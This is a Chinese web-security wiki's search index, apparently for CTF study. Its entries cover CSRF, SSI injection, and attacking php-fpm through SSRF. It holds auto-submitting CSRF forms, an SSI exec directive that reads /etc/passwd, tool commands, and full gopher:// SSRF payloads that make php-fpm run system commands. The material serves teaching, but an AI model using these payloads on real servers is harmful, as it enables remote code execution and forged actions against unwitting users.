\u53d1\u9001\u4e86\u4e00\u4e2a\u8bf7\u6c42\uff1aa.com/act=xx\u3002\u6d4f\u89c8\u5668\u4f1a\u9ed8\u8ba4\u643a\u5e26a.com\u7684Cookie\u3002a.com\u63a5\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u5bf9\u8bf7\u6c42\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5e76\u786e\u8ba4\u662f\u53d7\u5bb3\u8005\u7684\u51ed\u8bc1\uff0c\u8bef\u4ee5\u4e3a\u662f\u53d7\u5bb3\u8005\u81ea\u5df1\u53d1\u9001\u7684\u8bf7\u6c42\u3002a.com\u4ee5\u53d7\u5bb3\u8005\u7684\u540d\u4e49\u6267\u884c\u4e86act=xx\u3002\u653b\u51fb\u5b8c\u6210\uff0c\u653b\u51fb\u8005\u5728\u53d7\u5bb3\u8005\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u5192\u5145\u53d7\u5bb3\u8005\uff0c\u8ba9a.com\u6267\u884c\u4e86\u81ea\u5df1\u5b9a\u4e49\u7684\u64cd\u4f5c\u3002</p> <p>GET\u578b</p> <pre><code>&lt;img src=http://xxx.org/csrf.php?xx=1 /&gt;\n\u8bbf\u95ee\u9875\u9762\u540e\u5c31\u6210\u529f\u5411http://xxx.org/csrf.php \u53d1\u9001\u4e86\u4e00\u6b21\u8bf7\u6c42\n&lt;link href=\"\u2026\"&gt;\n&lt;iframe src=\"\u2026\"&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0; url=\u2026\"&gt;\n&lt;script src=\"\u2026\"&gt;\n&lt;video src=\"\u2026\"&gt;\n&lt;audio src=\"\u2026\"&gt;\n&lt;a href=\"\u2026\"&gt;\n&lt;table background=\"\u2026\"&gt;\nPlain Text\n</code></pre> <p>POST\u578b</p> <pre><code>&lt;form action=http://woyun.org/csrf.php method=POST&gt;\n&lt;input type=\"text\" name='xx' value='11' /&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;\nPlain Text\n</code></pre>"},{"location":"web/csrf_ssrf_ssi/CSRF/#_2","title":"\u4f8b\u9898","text":"<p>\u4ece\u4e00\u9053\u9ad8\u8d28\u91cf\u7684ctf\u9898\u4e2d\u770b\u6e17\u900f\u6d4b\u8bd5 - \u5b89\u5168\u5ba2\uff0c\u5b89\u5168\u8d44\u8baf\u5e73\u53f0</p> <p>\u6700\u8fd1\u505a\u4e86\u4e00\u9053\u8d28\u91cf\u633a\u4e0d\u9519\u7684ctf\u9898\uff0c\u6d89\u53caweb\u6e17\u900f\u3001sql\u6ce8\u5165\u3001csrf\u3001\u6743\u9650\u63d0\u5347\u7b49\u77e5\u8bc6\u70b9\uff0c\u6240\u4ee5\u7279\u5730\u91cd\u65b0\u81ea\u5df1\u642d\u4e86\u4e2a\u73af\u5883\u590d\u73b0\u4e86\u4e00\u4e0b\u8fd9\u9053\u9ad8\u8d28\u91cf\u7684ctf\u9898\u5206\u4eab\u7ed9\u5927\u5bb6\uff0c\u5e76\u8c08\u8c08\u4e00\u4e9b\u4e2a\u4eba\u7684\u611f\u609f\u3002</p> <p>https://www.anquanke.com/post/id/97567</p> <p>\u5927\u5bb6\u81ea\u5df1\u770b\u770b\uff1f\u786e\u5b9e\u662f\u9ad8\u7ea7\u70b9\u7684XSS,\u6bd4\u8f83\u91cd\u5408\uff0c\u4e0d\u505a\u8fc7\u591a\u53d9\u8ff0</p>"},{"location":"web/csrf_ssrf_ssi/SSI/","title":"SSI","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>(shtml\u6f0f\u6d1e)</p> <p>SSI \u6ce8\u5165\u5168\u79f0Server-SideIncludes Injection\uff0c\u5373\u670d\u52a1\u7aef\u5305\u542b\u6ce8\u5165\u3002SSI \u662f\u7c7b\u4f3c\u4e8e CGI\uff0c\u7528\u4e8e\u52a8\u6001\u9875\u9762\u7684\u6307\u4ee4\u3002SSI \u6ce8\u5165\u5141\u8bb8\u8fdc\u7a0b\u5728 Web \u5e94\u7528\u4e2d\u6ce8\u5165\u811a\u672c\u6765\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSI/#ssi_1","title":"SSI\u4ecb\u7ecd\u4e0e\u5229\u7528","text":"<p>SSI\u662f\u5d4c\u5165HTML\u9875\u9762\u4e2d\u7684\u6307\u4ee4\uff0c\u5728\u9875\u9762\u88ab\u63d0\u4f9b\u65f6\u7531\u670d\u52a1\u5668\u8fdb\u884c\u8fd0\u7b97\uff0c\u4ee5\u5bf9\u73b0\u6709HTML\u9875\u9762\u589e\u52a0\u52a8\u6001\u751f\u6210\u7684\u5185\u5bb9\uff0c\u800c\u65e0\u987b\u901a\u8fc7CGI\u7a0b\u5e8f\u63d0\u4f9b\u5176\u6574\u4e2a\u9875\u9762\uff0c\u6216\u8005\u4f7f\u7528\u5176\u4ed6\u52a8\u6001\u6280\u672f\u3002</p> <p>\u4ece\u6280\u672f\u89d2\u5ea6\u4e0a\u6765\u8bf4\uff0cSSI\u5c31\u662f\u5728HTML\u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u6ce8\u91ca\u884c\u8c03\u7528\u7684\u547d\u4ee4\u6216\u6307\u9488\uff0c\u5373\u5141\u8bb8\u901a\u8fc7\u5728HTML\u9875\u9762\u6ce8\u5165\u811a\u672c\u6216\u8fdc\u7a0b\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u5728\u5f88\u591a\u4e1a\u52a1\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u4f1a\u663e\u793a\u5728\u9875\u9762\u4e2d\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u5b58\u5728\u53cd\u5c04\u578bXSS\u6f0f\u6d1e\u7684\u9875\u9762\uff0c\u5982\u679c\u8f93\u5165\u7684payload\u4e0d\u662fXSS\u4ee3\u7801\u800c\u662fSSI\u7684\u6807\u7b7e\uff0c\u540c\u65f6\u670d\u52a1\u5668\u53c8\u5f00\u542f\u4e86\u5bf9SSI\u7684\u652f\u6301\u7684\u8bdd\u5c31\u4f1a\u5b58\u5728SSI\u6f0f\u6d1e\u3002</p> <p>\u4ece\u5b9a\u4e49\u4e2d\u770b\u51fa\uff0c\u9875\u9762\u4e2d\u6709\u4e00\u5c0f\u90e8\u5206\u662f\u52a8\u6001\u8f93\u51fa\u7684\u65f6\u5019\u4f7f\u7528SSI\uff0c\u6bd4\u5982\uff1a</p> <p>\u00b7       \u6587\u4ef6\u76f8\u5173\u7684\u5c5e\u6027\u5b57\u6bb5</p> <p>\u00b7       \u5f53\u524d\u65f6\u95f4</p> <p>\u00b7       \u8bbf\u5ba2IP</p> <p>\u00b7       \u8c03\u7528CGI\u7a0b\u5e8f</p>"},{"location":"web/csrf_ssrf_ssi/SSI/#_1","title":"SSI","text":"<p>\u600e\u4e48\u8bf4\u5462\uff0c\u5176\u5b9e\u8bb2\u8d77\u6765\u8fd8\u633a\u7b80\u5355\u7684</p> <p>\u8fd9\u4e2a\u6f0f\u6d1e\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u5f00\u542f\u4e00\u4e2a\u6a21\u5f0f\u53eb\u505a\u6ce8\u91ca\u884c\u7684\u5199\u5165</p> <p>\u4e5f\u5c31\u662f\u6bd4\u5982\u4e00\u4e2aHTML\u7f51\u9875</p> <p>\u6211\u4eec\u53ef\u4ee5\u5199\u5165\u6ce8\u91ca</p> <p>\u7136\u540e\u521a\u597d\u8fd9\u6761\u6ce8\u91ca\u5b9e\u53ef\u4ee5\u4ee5\u67d0\u79cd\u65b9\u5f0f\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u7684\u3002</p> <pre><code>\u5176\u4f59\u7684\u8bdd\u8fd8\u6709\uff1a\n\u2460\u663e\u793a\u670d\u52a1\u5668\u7aef\u73af\u5883\u53d8\u91cf&lt;#echo&gt;\n\u672c\u6587\u6863\u540d\u79f0\uff1a\n&lt;!\u2013#echo var=\"DOCUMENT_NAME\"\u2013&gt;\n\u73b0\u5728\u65f6\u95f4\uff1a\n&lt;!\u2013#echo var=\"DATE_LOCAL\"\u2013&gt;\n\u663e\u793aIP\u5730\u5740\uff1a\n&lt;! #echo var=\"REMOTE_ADDR\"\u2013&gt;\n\u2461\u5c06\u6587\u672c\u5185\u5bb9\u76f4\u63a5\u63d2\u5165\u5230\u6587\u6863\u4e2d&lt;#include&gt;\n&lt;! #include file=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#include virtual=\"index.html\" --&gt;\n&lt;! #include virtual=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#include virtual=\"/www/footer.html\" --&gt;\n\u6ce8\uff1afile\u5305\u542b\u6587\u4ef6\u53ef\u4ee5\u5728\u540c\u4e00\u7ea7\u76ee\u5f55\u6216\u5176\u5b50\u76ee\u5f55\u4e2d\uff0c\u4f46\u4e0d\u80fd\u5728\u4e0a\u4e00\u7ea7\u76ee\u5f55\u4e2d\uff0cvirtual\u5305\u542b\u6587\u4ef6\u53ef\u4ee5\u662fWeb\u7ad9\u70b9\u4e0a\u7684\u865a\u62df\u76ee\u5f55\u7684\u5b8c\u6574\u8def\u5f84\n\u2462\u663e\u793aWEB\u6587\u6863\u76f8\u5173\u4fe1\u606f&lt;#flastmod&gt;&lt;#fsize&gt;(\u5982\u6587\u4ef6\u5236\u4f5c\u65e5\u671f/\u5927\u5c0f\u7b49)\n\u6587\u4ef6\u6700\u8fd1\u66f4\u65b0\u65e5\u671f\uff1a\n&lt;! #flastmod file=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n\u6587\u4ef6\u7684\u957f\u5ea6\uff1a\n&lt;!\u2013#fsize file=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n\u2463\u76f4\u63a5\u6267\u884c\u670d\u52a1\u5668\u4e0a\u7684\u5404\u79cd\u7a0b\u5e8f&lt;#exec&gt;(\u5982CGI\u6216\u5176\u4ed6\u53ef\u6267\u884c\u7a0b\u5e8f)\n&lt;!\u2013#exec cmd=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#exec cmd=\"cat /etc/passwd\"--&gt;\n&lt;!\u2013#exec cgi=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#exec cgi=\"/cgi-bin/access_log.cgi\"\u2013&gt;\n\u76f8\u5f53\u4e8e\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u4e86\u6240\u9700\u8981\u7684\u4ee3\u7801\uff0c\u8fd4\u56de\u67e5\u627e\u5373\u53ef\nPlain Text\n</code></pre>"},{"location":"web/csrf_ssrf_ssi/SSRF/FastCGI/","title":"FastCGI","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>FastCGI\u6307\u5feb\u901f\u901a\u7528\u7f51\u5173\u63a5\u53e3\uff08Fast Common Gateway Interface\uff0fFastCGI\uff09\u662f\u4e00\u79cd\u8ba9\u4ea4\u4e92\u7a0b\u5e8f\u4e0eWeb\u670d\u52a1\u5668\u901a\u4fe1\u7684\u534f\u8bae\u3002FastCGI\u662f\u65e9\u671f\u901a\u7528\u7f51\u5173\u63a5\u53e3\uff08CGI\uff09\u7684\u589e\u5f3a\u7248\u672c\u3002FastCGI\u81f4\u529b\u4e8e\u51cf\u5c11\u7f51\u9875\u670d\u52a1\u5668\u4e0eCGI\u7a0b\u5e8f\u4e4b\u95f4\u4ea4\u4e92\u7684\u5f00\u9500\uff0c\u4ece\u800c\u4f7f\u670d\u52a1\u5668\u53ef\u4ee5\u540c\u65f6\u5904\u7406\u66f4\u591a\u7684\u7f51\u9875\u8bf7\u6c42\u3002</p> <p>\u4f17\u6240\u5468\u77e5\uff0c\u5728\u7f51\u7ad9\u5206\u7c7b\u4e2d\u5b58\u5728\u4e00\u79cd\u5206\u7c7b\u5c31\u662f\u9759\u6001\u7f51\u7ad9\u548c\u52a8\u6001\u7f51\u7ad9\uff0c\u4e24\u8005\u7684\u533a\u522b\u5c31\u662f\u9759\u6001\u7f51\u7ad9\u53ea\u9700\u8981\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u89e3\u6790\uff0c\u800c\u52a8\u6001\u7f51\u7ad9\u9700\u8981\u4e00\u4e2a\u989d\u5916\u7684\u7f16\u8bd1\u89e3\u6790\u7684\u8fc7\u7a0b\u3002\u4ee5Apache\u4e3a\u4f8b\uff0c\u5f53\u8bbf\u95ee\u52a8\u6001\u7f51\u7ad9\u7684\u4e3b\u9875\u65f6\uff0c\u6839\u636e\u5bb9\u5668\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u77e5\u9053\u8fd9\u4e2a\u9875\u9762\u4e0d\u662f\u9759\u6001\u9875\u9762\uff0cWeb\u5bb9\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u8bf7\u6c42\u8fdb\u884c\u7b80\u5355\u7684\u5904\u7406\uff0c\u7136\u540e\u5982\u679c\u4f7f\u7528\u7684\u662fCGI\uff0c\u5c31\u4f1a\u542f\u52a8CGI\u7a0b\u5e8f\uff08\u5bf9\u5e94\u7684\u5c31\u662fPHP\u89e3\u91ca\u5668\uff09\u3002\u63a5\u4e0b\u6765PHP\u89e3\u6790\u5668\u4f1a\u89e3\u6790php.ini\u6587\u4ef6\uff0c\u521d\u59cb\u5316\u6267\u884c\u73af\u5883\uff0c\u7136\u540e\u5904\u7406\u8bf7\u6c42\uff0c\u518d\u4ee5\u89c4\u5b9aCGI\u89c4\u5b9a\u7684\u683c\u5f0f\u8fd4\u56de\u5904\u7406\u540e\u7684\u7ed3\u679c\uff0c\u9000\u51fa\u8fdb\u7a0b\uff0cWeb server\u518d\u628a\u7ed3\u679c\u8fd4\u56de\u7ed9\u6d4f\u89c8\u5668\u3002\u8fd9\u5c31\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u52a8\u6001PHP Web\u8bbf\u95ee\u6d41\u7a0b\u3002\u8fd9\u91cc\u8bf4\u7684\u662f\u4f7f\u7528CGI\uff0c\u800cFastCGI\u5c31\u76f8\u5f53\u4e8e\u9ad8\u6027\u80fd\u7684CGI\uff0c\u4e0eCGI\u4e0d\u540c\u7684\u662f\u5b83\u50cf\u4e00\u4e2a\u5e38\u9a7b\u7684CGI\uff0c\u5728\u542f\u52a8\u540e\u4f1a\u4e00\u76f4\u8fd0\u884c\u7740\uff0c\u4e0d\u9700\u8981\u6bcf\u6b21\u5904\u7406\u6570\u636e\u65f6\u90fd\u542f\u52a8\u4e00\u6b21\uff0c\u6240\u4ee5FastCGI\u7684\u4e3b\u8981\u884c\u4e3a\u662f\u5c06CGI\u89e3\u91ca\u5668\u8fdb\u7a0b\u4fdd\u6301\u5728\u5185\u5b58\u4e2d\uff0c\u5e76\u56e0\u6b64\u83b7\u5f97\u8f83\u9ad8\u7684\u6027\u80fd \u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/FastCGI/#php-fpm","title":"php-fpm","text":"<p>FPM\uff08FastCGI \u8fdb\u7a0b\u7ba1\u7406\u5668\uff09\u53ef\u4ee5\u8bf4\u662fFastCGI\u7684\u4e00\u4e2a\u5177\u4f53\u5b9e\u73b0\uff0c\u7528\u4e8e\u66ff\u6362 PHP FastCGI \u7684\u5927\u90e8\u5206\u9644\u52a0\u529f\u80fd\uff0c\u5bf9\u4e8e\u9ad8\u8d1f\u8f7d\u7f51\u7ad9\u662f\u975e\u5e38\u6709\u7528\u7684\u3002</p> <p>\u653b\u51fbFastCGI\u7684\u4e3b\u8981\u539f\u7406\u5c31\u662f\uff0c\u5728\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u5b9e\u9645\u8bf7\u6c42\u4e2d\u4f1a\u51fa\u73b0\u4e00\u4e2a<code>SCRIPT_FILENAME': '/var/www/html/index.php</code>\u8fd9\u6837\u7684\u952e\u503c\u5bf9\uff0c\u5b83\u7684\u610f\u601d\u662fphp-fpm\u4f1a\u6267\u884c\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u6837\u5373\u4f7f\u80fd\u591f\u63a7\u5236\u8fd9\u4e2a\u952e\u503c\u5bf9\u7684\u503c\uff0c\u4f46\u4e5f\u53ea\u80fd\u63a7\u5236php-fpm\u53bb\u6267\u884c\u67d0\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u4e0d\u80fd\u591f\u5b9e\u73b0\u4e00\u4e9b\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u3002</p> <p>\u800c\u5728PHP 5.3.9\u540e\u6765\u7684\u7248\u672c\u4e2d\uff0cPHP\u589e\u52a0\u4e86\u5b89\u5168\u9009\u9879\u5bfc\u81f4\u53ea\u80fd\u63a7\u5236php-fpm\u6267\u884c\u4e00\u4e9bphp\u3001php4\u8fd9\u6837\u7684\u6587\u4ef6\uff0c\u8fd9\u4e5f\u589e\u5927\u4e86\u653b\u51fb\u7684\u96be\u5ea6\u3002\u4f46\u662f\u597d\u5728PHP\u5141\u8bb8\u901a\u8fc7PHP_ADMIN_VALUE\u548cPHP_VALUE\u53bb\u52a8\u6001\u4fee\u6539PHP\u7684\u8bbe\u7f6e\u3002</p> <p>\u90a3\u4e48\u5f53\u8bbe\u7f6ePHP\u73af\u5883\u53d8\u91cf\u4e3a\uff1a<code>auto_prepend_file = php://input;allow_url_include = On</code>\u65f6\uff0c\u5c31\u4f1a\u5728\u6267\u884cPHP\u811a\u672c\u4e4b\u524d\u5305\u542b\u73af\u5883\u53d8\u91cf<code>auto_prepend_file</code>\u6240\u6307\u5411\u7684\u6587\u4ef6\u5185\u5bb9\uff0c<code>php://input</code>\u4e5f\u5c31\u662f\u63a5\u6536POST\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u6211\u4eec\u53ef\u4ee5\u5728FastCGI\u534f\u8bae\u7684body\u63a7\u5236\u4e3a\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u6837\u5c31\u5728\u7406\u8bba\u4e0a\u5b9e\u73b0\u4e86php-fpm\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u653b\u51fb\u3002</p> <p>\u8be6\u60c5\u8bf7\u89c1\uff1a\u300aSSRF\u7cfb\u5217\u4e4b\u653b\u51fbFastCGI\u300b</p> <p>\u6d4b\u8bd5\u73af\u5883\uff1a</p> <p></p> <p>WEB\u670d\u52a1\u5668Ubuntu\uff08192.168.43.166\uff09\u5b58\u5728SSRF\u6f0f\u6d1e\uff1a</p> <p></p> <p>\u5e76\u4e14WEB\u670d\u52a1\u5668Ubuntu\u4e0a\u5b58\u5728FastCGI\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u5176SSRF\u6f0f\u6d1e\u53bb\u653b\u51fb\u5176\u672c\u5730\u7684FastCGI\u3002</p> <p>\u5047\u8bbe\u5728\u914d\u7f6efpm\u65f6\uff0c\u5c06\u76d1\u542c\u7684\u5730\u5740\u8bbe\u4e3a\u4e860.0.0.0:9000\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751fphp-fpm\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u53ef\u4ee5\u65e0\u9700\u5229\u7528SSRF\u4ece\u670d\u52a1\u5668\u672c\u5730\u8bbf\u95ee\u7684\u7279\u6027\uff0c\u76f4\u63a5\u4e0e\u670d\u52a1\u56689000\u7aef\u53e3\u4e0a\u7684php-fpm\u8fdb\u884c\u901a\u4fe1\uff0c\u8fdb\u800c\u53ef\u4ee5\u7528fcgi_exp\u7b49\u5de5\u5177\u53bb\u653b\u51fb\u670d\u52a1\u5668\u4e0a\u7684php-fpm\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\u5f53\u5185\u7f51\u4e2d\u7684\u5176\u4ed6\u4e3b\u673a\u4e0a\u914d\u7f6e\u6709fpm\uff0c\u4e14\u76d1\u542c\u7684\u5730\u5740\u4e3a0.0.0.0:9000\u65f6\uff0c\u90a3\u4e48\u8fd9\u53f0\u4e3b\u673a\u5c31\u53ef\u80fd\u5b58\u5728php-fpm\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528Ubuntu\u670d\u52a1\u5668\u4e0a\u7684SSRF\u53bb\u653b\u51fb\u4ed6\uff0c\u5982\u679c\u5185\u7f51\u4e2d\u7684\u8fd9\u53f0\u4e3b\u673a\u4e0d\u5b58\u5728php-fpm\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u90a3\u4e48\u5c31\u76f4\u63a5\u5229\u7528Ubuntu\u670d\u52a1\u5668\u4e0a\u7684SSRF\u53bb\u653b\u51fb\u4ed6\u663e\u7136\u662f\u4e0d\u884c\u7684\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/FastCGI/#fcgi_exp","title":"\u4f7f\u7528fcgi_exp\u5de5\u5177\u653b\u51fb","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/piaca/fcgi_exp</p> <p>\u8fd9\u4e2a\u5de5\u5177\u4e3b\u8981\u662f\u7528\u6765\u653b\u51fb\u672a\u6388\u6743\u8bbf\u95eephp-fpm\u7684\uff0c\u53ef\u7528\u6765\u6d4b\u8bd5\u662f\u5426\u53ef\u4ee5\u76f4\u63a5\u653b\u51fbphp-fpm\uff0c\u4f46\u9700\u8981\u81ea\u5df1\u5c06\u751f\u6210\u7684payload\u8fdb\u884c\u8f6c\u6362\u4e00\u4e0b\u3002</p> <p>\u8be5\u5de5\u5177\u9700\u8981go\u8bed\u8a00\u73af\u5883\uff0c\u4e0b\u8f7d\u540e\u8fdb\u5165\u76ee\u5f55\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1\uff1a</p> <pre><code>go build fcgi_exp.go \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0# \u7f16\u8bd1fcgi_exp.go\nPlain Text\n</code></pre> <p>\u7f16\u8bd1\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u5728\u653b\u51fb\u673a\u4e0a\u4f7f\u7528<code>nc -lvvp 2333 &gt; fcg_exp.txt</code>\u76d1\u542c2333 \u7aef\u53e3\u6765\u63a5\u6536fcgi_exp\u751f\u6210\u7684payload\uff0c\u53e6\u5916\u518d\u5f00\u542f\u4e00\u4e2a\u7ec8\u7aef\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u54112333\u7aef\u53e3\u53d1\u9001payload\uff1a</p> <pre><code>./fcgi_exp system 127.0.0.1 2333 /var/www/html/index.php \"id\"\nPlain Text\n</code></pre> <p></p> <p>\u751f\u6210\u7684fcg_exp.txt\u6587\u4ef6\u7684\u5185\u5bb9\u662f\u63a5\u6536\u5230\u7684payload\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a</p> <p></p> <p>\u7136\u540e\u5bf9fcg_exp.txt\u6587\u4ef6\u91cc\u7684payload\u8fdb\u884curl\u7f16\u7801\uff0c\u8fd9\u91cc\u901a\u8fc7\u5982\u4e0b\u811a\u672c\u5b9e\u73b0\uff08\u811a\u672c\u662f\u6211\u4ece\u7f51\u4e0a\u767d\u5ad6\u7684\u563f\u563f\uff09\uff1a</p> <pre><code># -*- coding: UTF-8 -*-from urllib.parse import quote, unquote, urlencode\u200bfile = open('fcg_exp.txt','r')payload = file.read()print(\"gopher://127.0.0.1:9000/_\"+quote(payload).replace(\"%0A\",\"%0D\").replace(\"%2F\",\"/\"))\nPlain Text\n</code></pre> <p>\u6267\u884c\u4e0a\u9762\u7684python\u811a\u672c\u751f\u6210\u5982\u4e0bpayload\uff1a</p> <p></p> <p>\u8fd9\u91cc\u8fd8\u8981\u5bf9\u4e0a\u9762\u7684payload\u8fdb\u884c\u4e8c\u6b21url\u7f16\u7801\uff0c\u7136\u540e\u5c06\u6700\u7ec8\u7684payload\u5185\u5bb9\u653e\u5230?url=\u540e\u9762\u53d1\u9001\u8fc7\u53bb\uff1a</p> <pre><code>ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509%255BPHP_VALUEallow_url_include%2520%253D%2520On%250Ddisable_functions%2520%253D%2520%250Dsafe_mode%2520%253D%2520Off%250Dauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E\nPlain Text\n</code></pre> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u547d\u4ee4\u6267\u884c\u6210\u529f\uff1a</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/FastCGI/#gopherus","title":"\u4f7f\u7528Gopherus\u5de5\u5177\u653b\u51fb","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/tarunkant/Gopherus</p> <p>\u8be5\u5de5\u5177\u53ef\u4ee5\u5e2e\u4f60\u751f\u6210\u7b26\u5408Gopher\u534f\u8bae\u683c\u5f0f\u7684payload\uff0c\u4ee5\u5229\u7528SSRF\u653b\u51fbRedis\u3001FastCGI\u3001MySql\u7b49\u5185\u7f51\u5e94\u7528\u3002</p> <p>\u4f7f\u7528Gopherus\u5de5\u5177\u751f\u6210\u653b\u51fbFastCGI\u7684payload\uff1a</p> <pre><code>python gopherus.py --exploit fastcgi/var/www/html/index.php \u00a0 \u00a0# \u8fd9\u91cc\u8f93\u5165\u7684\u662f\u4e00\u4e2a\u5df2\u77e5\u5b58\u5728\u7684php\u6587\u4ef6id \u00a0 \u00a0# \u8f93\u5165\u4e00\u4e2a\u4f60\u8981\u6267\u884c\u7684\u547d\u4ee4\nPlain Text\n</code></pre> <p></p> <p>\u7136\u540e\u8fd8\u662f\u5c06\u5f97\u5230\u7684payload\u8fdb\u884c\u4e8c\u6b21url\u7f16\u7801\uff0c\u5c06\u6700\u7ec8\u5f97\u5230\u7684payload\u653e\u5230?url=\u540e\u9762\u6253\u8fc7\u53bb\u8fc7\u53bb\uff1a</p> <pre><code>ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\nPlain Text\n</code></pre> <p></p> <p>\u547d\u4ee4\u6267\u884c\u6210\u529f\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/Gopher%E5%8D%8F%E8%AE%AE/","title":"Gopher\u534f\u8bae","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u4e2a\u5f88\u91cd\u8981</p> <p>Gopher\u534f\u8bae\u5728SSRF\u4e2d\u7684\u5229\u7528</p> <p>Gopher\u662fInternet\u4e0a\u4e00\u4e2a\u975e\u5e38\u6709\u540d\u7684\u4fe1\u606f\u67e5\u627e\u7cfb\u7edf\uff0c\u5b83\u5c06Internet\u4e0a\u7684\u6587\u4ef6\u7ec4\u7ec7\u6210\u67d0\u79cd\u7d22\u5f15\uff0c\u5f88\u65b9\u4fbf\u5730\u5c06\u7528\u6237\u4eceInternet\u7684\u4e00\u5904\u5e26\u5230\u53e6\u4e00\u5904\u3002\u5728WWW\u51fa\u73b0\u4e4b\u524d\uff0cGopher\u662fInternet\u4e0a\u6700\u4e3b\u8981\u7684\u4fe1\u606f\u68c0\u7d22\u5de5\u5177\uff0cGopher\u7ad9\u70b9\u4e5f\u662f\u6700\u4e3b\u8981\u7684\u7ad9\u70b9\uff0c\u4f7f\u7528TCP 70\u7aef\u53e3\u3002\u4f46\u5728WWW\u51fa\u73b0\u540e\uff0cGopher\u5931\u53bb\u4e86\u6614\u65e5\u7684\u8f89\u714c\u3002</p> 